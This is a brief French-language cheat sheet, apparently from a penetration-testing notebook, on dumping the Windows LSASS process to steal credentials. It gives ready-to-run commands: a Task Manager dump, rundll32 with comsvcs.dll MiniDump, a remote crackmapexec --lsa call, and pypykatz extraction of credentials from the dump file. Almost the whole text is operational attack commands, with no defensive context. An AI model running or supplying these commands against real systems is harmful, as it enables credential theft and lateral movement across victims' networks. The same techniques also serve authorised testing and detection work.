---
public: true # set to true to make the article publishable
---

## DUMP de LSASS

## Localement
### Génération d'un dump via le gestionnaire de tâches

Bouton droit sur  le processus > Créer un fichier dump
Le fichier est créé dans le dossier %TEMP%

### Rundll32.exe & Comsvcs.dll
-  Trouver le pid de lsass : 
	- `tasklist /svc`
	- `Get-Process lsass`
- Créer le dump (pid = 672) :
	- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`




## A distance
```
crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
```

## Extraction d'informations d'identification

```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```